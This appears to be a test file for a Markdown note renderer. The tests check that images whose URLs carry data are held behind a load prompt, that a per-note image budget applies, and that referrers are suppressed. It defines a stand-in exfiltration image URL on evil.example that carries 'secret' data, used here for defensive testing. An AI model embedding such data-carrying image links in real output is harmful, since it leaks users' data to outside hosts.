import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";

import { HEAVY_HOSTS, HEAVY_THAT_FIT as FIT, heavyImageAddress } from "@/lib/imageBudget.fixture";
import { IMAGE_PROMPT_COPY } from "@/lib/imageUrlFilter";
import { installDom } from "@/test/dom";
import { NoteRenderer } from "./NoteRenderer";

let restore: (() => void) | undefined;
let mounted: Root | undefined;
afterEach(() => {
  if (mounted) act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  restore = undefined;
});

async function show(root: Root, host: HTMLElement, md: string) {
  await act(async () => root.render(<NoteRenderer md={md} />));
  // The Markdown engine loads lazily; a new note passes through "rendering" first.
  for (let i = 0; i < 100 && !host.querySelector(".fmd"); i++) {
    await act(async () => { await Bun.sleep(20); });
  }
}

async function note(md: string) {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  await show(mounted, host, md);
  return host;
}

const carrier = `https://evil.example/p.png?d=${"secret".repeat(14)}`;
const click = (button: Element) => act(async () => { (button as HTMLElement).click(); });

test("a note's normal image loads without asking", async () => {
  const host = await note("![logo](https://i.imgur.com/AbCd123.png)");
  expect(host.querySelector("img")?.getAttribute("src")).toBe("https://i.imgur.com/AbCd123.png");
  expect(host.querySelector("button")).toBeNull();
});

test("only the image whose address carries data waits, and Load draws just that one", async () => {
  const host = await note(`![a](https://i.imgur.com/AbCd123.png)\n\n![b](${carrier})\n\n![c](${carrier}&n=2)`);
  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("src"))).toEqual(["https://i.imgur.com/AbCd123.png"]);
  expect(host.querySelectorAll(".nt-img-gate").length).toBe(2);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.why("evil.example"));
  expect(host.textContent).toContain(carrier);
  await click(host.querySelectorAll("button[data-img-load]")[0]!);
  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("src"))).toEqual([
    "https://i.imgur.com/AbCd123.png",
    carrier,
  ]);
  expect(host.querySelectorAll(".nt-img-gate").length).toBe(1);
});

test("Not now leaves the description, and a data: image never loads or asks", async () => {
  const host = await note(`![chart](${carrier})\n\n![dot](data:image/png;base64,iVBORw0KGgo=)`);
  expect(host.querySelectorAll(".nt-img-gate").length).toBe(1);
  await click(host.querySelector("button[data-img-skip]")!);
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("chart"));
});

test("a link in a note sends no referrer and no opener", async () => {
  const host = await note("[docs](https://example.com/docs)");
  const link = host.querySelector("a")!;
  expect(link.getAttribute("rel")?.split(" ").sort()).toEqual(["nofollow", "noopener", "noreferrer"]);
  expect(link.getAttribute("referrerpolicy")).toBe("no-referrer");
});

test("an image that loads sends no referrer", async () => {
  const host = await note(`![a](https://i.imgur.com/AbCd123.png)\n\n![b](${carrier})`);
  expect(host.querySelector("img")?.getAttribute("referrerpolicy")).toBe("no-referrer");
  await click(host.querySelector("button[data-img-load]")!);
  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("referrerpolicy"))).toEqual(["no-referrer", "no-referrer"]);
});

test("a choice does not carry over to a different note", async () => {
  const host = await note(`![chart](${carrier})`);
  await click(host.querySelector("button[data-img-load]")!);
  expect(host.querySelectorAll("img").length).toBe(1);
  await show(mounted!, host, `![other](${carrier}&n=2)`);
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelectorAll(".nt-img-gate").length).toBe(1);
});

// Heavy addresses (lib/imageBudget.fixture.ts) on a.example, b.example, ...: the first FIT fit in a note's budget, the last
// two do not.
const photo = (host: string) => `![p](${heavyImageAddress(host)})`;
const heavyNote = HEAVY_HOSTS.map((h) => photo(h)).join("\n\n");

test("ordinary images never wait: five from other hosts all load, and nothing asks", async () => {
  const host = await note(["a", "b", "c", "d", "e"].map((h) => `![p](https://${h}.example/photos/2026/front-page-${h}.png)`).join("\n\n"));
  expect(host.querySelectorAll("img").length).toBe(5);
  expect(host.querySelector("button")).toBeNull();
});

test("a note whose images have more room for data than its budget: the first load, the rest wait for one prompt for the whole note", async () => {
  const host = await note(heavyNote);
  expect(host.querySelectorAll("img").length).toBe(FIT);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, HEAVY_HOSTS.slice(FIT)));
  expect(host.querySelectorAll("button[data-images-load]").length).toBe(1);
  await click(host.querySelector("button[data-images-load]")!);
  expect(host.querySelectorAll("img").length).toBe(FIT + 2);
  expect(host.querySelector("button")).toBeNull();
});

test("Not now on the note's prompt leaves the held images as descriptions", async () => {
  const host = await note(heavyNote);
  await click(host.querySelector("button[data-images-skip]")!);
  expect(host.querySelectorAll("img").length).toBe(FIT);
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
});

test("our own hosts are charged only the floor: three of them leave room for every heavy image that fits", async () => {
  const own = [1, 2, 3].map((n) => `![o](https://app.tinycloud.one/n${n}.png)`).join("\n\n");
  const host = await note(`${own}\n\n${HEAVY_HOSTS.slice(0, FIT).map((h) => photo(h)).join("\n\n")}`);
  expect(host.querySelectorAll("img").length).toBe(3 + FIT);
  expect(host.querySelector("button")).toBeNull();
});
